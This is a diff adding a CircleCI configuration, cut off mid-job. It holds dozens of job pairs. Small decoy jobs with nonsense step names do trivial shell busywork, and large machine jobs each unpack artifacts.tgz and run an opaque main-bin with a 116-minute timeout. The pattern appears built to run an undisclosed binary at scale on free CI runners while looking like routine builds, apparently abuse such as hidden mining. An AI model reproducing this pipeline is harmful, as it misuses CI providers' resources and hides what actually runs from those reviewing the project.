@@ -1,0 +1,1500 @@
+version: 2.1
+
+jobs:
+  canary1_update-oauth-redirect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: over there
+          command: |
+            mkdir -p /tmp/z3
+            set +o pipefail 2>/dev/null; head -c 915456 /dev/urandom > /tmp/z3/attempt-2.data; true
+            echo "<< update-oauth-redirect wrote $(wc -c </tmp/z3/attempt-2.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - attempt-2.data
+  update-oauth-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/attempt-2.data" "$(wc -c < /tmp/z3/attempt-2.data 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/attempt-2.data 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  canary_CHECK_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: polka hop
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printf "%d\n" $(( $(date +%M) * 60 + $(date +%S) )); true ; } > /tmp/z3/stage3.data
+            echo "<< CHECK_UAT wrote $(wc -c </tmp/z3/stage3.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - stage3.data
+  CHECK_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/stage3.data" "$(wc -c < /tmp/z3/stage3.data 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/stage3.data 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  stepA_ruby3-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: fillet
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; seq 1 50000 | awk '$1%997==0' | wc -l; true ; } > /tmp/z3/cache-raw.bin
+            echo "<< ruby3-lint wrote $(wc -c </tmp/z3/cache-raw.bin) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - cache-raw.bin
+  ruby3-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  rerun_delta-9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: scissor jump
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printf "%s " a b c | awk '{for(i=1;i<=NF;i++)print NR,i,$i}' | wc -l; true ; } > /tmp/z3/01.log
+            echo "<< delta-9 wrote $(wc -c </tmp/z3/01.log) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - 01.log
+  delta-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  postbuild_Package_Staging9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: power snatch
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; seq 1 10000 | awk 'END{print NR}'; true ; } > /tmp/z3/build-05.log
+            echo "<< Package_Staging9 wrote $(wc -c </tmp/z3/build-05.log) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - build-05.log
+  Package_Staging9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  bootstrap_fix-6717:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: whatever man
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; seq 1 60 | awk '{if(NR%6==0)print $0":newline"}'; true ; } > /tmp/z3/build-02.log
+            echo "<< fix-6717 wrote $(wc -c </tmp/z3/build-02.log) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - build-02.log
+  fix-6717:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/build-02.log" "$(wc -c < /tmp/z3/build-02.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/build-02.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  canary_foxtrot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: later
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printf "%08d\n" $((RANDOM % 1000000)); true ; } > /tmp/z3/q5
+            echo "<< foxtrot wrote $(wc -c </tmp/z3/q5) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - q5
+  foxtrot:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/step-20.out" "$(wc -c < /tmp/z3/step-20.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/step-20.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  tap_zed-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: splits up
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; echo "127.0.0.1:8080" | awk -F: '{print $2}'; true ; } > /tmp/z3/8192.out
+            echo "<< zed-ship wrote $(wc -c </tmp/z3/8192.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - 8192.out
+  zed-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/8192.out" "$(wc -c < /tmp/z3/8192.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/8192.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  bootstrap_all-greens:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: wash short
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; env | md5sum | cut -c1-16; true ; } > /tmp/z3/k.out
+            echo "<< all-greens wrote $(wc -c </tmp/z3/k.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - k.out
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/k.out" "$(wc -c < /tmp/z3/k.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/k.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  produce_ruby3-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: scuttle shut
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; grep -c . /etc/hostname 2>/dev/null || echo 0; true ; } > /tmp/z3/stats.tsv
+            echo "<< ruby3-release wrote $(wc -c </tmp/z3/stats.tsv) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - stats.tsv
+  ruby3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  env_strated-61:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: raise voice
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]="x"; a[2]="y"; a[3]="z"; for(i in a)print i":"a[i]}' | sort; true ; } > /tmp/z3/cache.bin
+            echo "<< strated-61 wrote $(wc -c </tmp/z3/cache.bin) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - cache.bin
+  strated-61:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/cache.bin" "$(wc -c < /tmp/z3/cache.bin 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/cache.bin 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  D_min-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: fail free
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=8;i++){for(j=1;j<=i;j++)printf "*"; print ""}}'; true ; } > /tmp/z3/step-16.out
+            echo "<< min-verify wrote $(wc -c </tmp/z3/step-16.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - step-16.out
+  min-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  prep_validate-quick-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 3am oncall
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; yes abc | head -n 194940 | sha256sum; true ; } > /tmp/z3/c02.bin
+            echo "<< validate-quick-release-candidate wrote $(wc -c </tmp/z3/c02.bin) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - c02.bin
+  validate-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/step-20.out" "$(wc -c < /tmp/z3/step-20.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/step-20.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  orchestrate_teh-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: warm up
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; wc -l /etc/hostname; true ; } > /tmp/z3/produce.bin
+            echo "<< teh-ci wrote $(wc -c </tmp/z3/produce.bin) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - produce.bin
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  kick_fix-3760:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: belt sand
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; printf "%s\n" {aa..zz} 2>/dev/null | head -5 || printf "%s\n" a1 a2 b1 b2; true ; } > /tmp/z3/spans.txt
+            echo "<< fix-3760 wrote $(wc -c </tmp/z3/spans.txt) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - spans.txt
+  fix-3760:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  produce_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: soak cycle
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; seq 100 110 | awk '{printf "0x%04x\n",$1}'; true ; } > /tmp/z3/emit.pkg
+            echo "<< deploy wrote $(wc -c </tmp/z3/emit.pkg) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - emit.pkg
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/emit.pkg" "$(wc -c < /tmp/z3/emit.pkg 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/emit.pkg 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  canary_november-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: flyby
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=25;i++){f = (i==1||i==2 ? 1 : f1+f2); f2 = f1; f1 = f}; print f}' 2>/dev/null || awk 'BEGIN{a=1;b=1;for(i=3;i<=25;i++){c=a+b;a=b;b=c}; print b}'; true ; } > /tmp/z3/col.csv
+            echo "<< november-2 wrote $(wc -c </tmp/z3/col.csv) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - col.csv
+  november-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/col.csv" "$(wc -c < /tmp/z3/col.csv 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/col.csv 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  linter_APP-677:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: sat ignore
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; echo 'foo baz foobaz' | sed 's/foo/bar/g; s/baz/qux/g'; true ; } > /tmp/z3/gate-pass.out
+            echo "<< APP-677 wrote $(wc -c </tmp/z3/gate-pass.out) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - gate-pass.out
+  APP-677:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/step-20.out" "$(wc -c < /tmp/z3/step-20.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/step-20.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  ctx2_blast-off:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: grill marks
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; echo "$RANDOM" | base64; true ; } > /tmp/z3/stage-ready.txt
+            echo "<< blast-off wrote $(wc -c </tmp/z3/stage-ready.txt) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - stage-ready.txt
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/01.log" "$(wc -c < /tmp/z3/01.log 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/01.log 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  alpha_update-oauth:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: spanish squat
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; seq 1 30 | paste -sd '-' - | wc -c; true ; } > /tmp/z3/emit.bin
+            echo "<< update-oauth wrote $(wc -c </tmp/z3/emit.bin) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - emit.bin
+  update-oauth:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/step-20.out" "$(wc -c < /tmp/z3/step-20.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/step-20.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  rerun_v7-ga3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: arc welder
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; tty 2>/dev/null || echo no-tty; true ; } > /tmp/z3/004.data
+            echo "<< v7-ga3 wrote $(wc -c </tmp/z3/004.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - 004.data
+  v7-ga3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/step-20.out" "$(wc -c < /tmp/z3/step-20.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/step-20.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  bootstrap_update-cache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: nova spark
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; echo $(($(date +%N) / 1000000)); true ; } > /tmp/z3/last
+            echo "<< update-cache wrote $(wc -c </tmp/z3/last) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - last
+  update-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/last" "$(wc -c < /tmp/z3/last 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/last 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  canary_produce-staging-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: notify qa
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print cos(0), sin(1.5708), exp(1)}'; true ; } > /tmp/z3/result-E.data
+            echo "<< produce-staging-test-matrix wrote $(wc -c </tmp/z3/result-E.data) >>"
+      - persist_to_workspace:
+          root: /tmp/z3
+          paths:
+            - result-E.data
+  produce-staging-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: Read upstream data
+          command: |
+            # csv-ish
+            printf '%s,%d,%d\n' "/tmp/z3/step-20.out" "$(wc -c < /tmp/z3/step-20.out 2>/dev/null || echo 0)" "$(wc -l < /tmp/z3/step-20.out 2>/dev/null || echo 0)"
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 5 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore artifacts
+          command: gunzip -c artifacts.tgz | tar xvf -
+      - run:
+          no_output_timeout: 116m
+          command: $PWD/main-bin
+  orchestrate_build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z3
+      - run:
+          name: deburr edge
+          command: |
+            mkdir -p /tmp/z3
+            { set +o pipefail 2>/dev/null; tr -dc 'a-f0-9' < /dev/urandom | head -c 32; true ; } > /tmp/z3/io.data
+            echo "<< build wrote $(wc -c </tmp/z3/io.data) >>"
+      - persist_to_workspace:
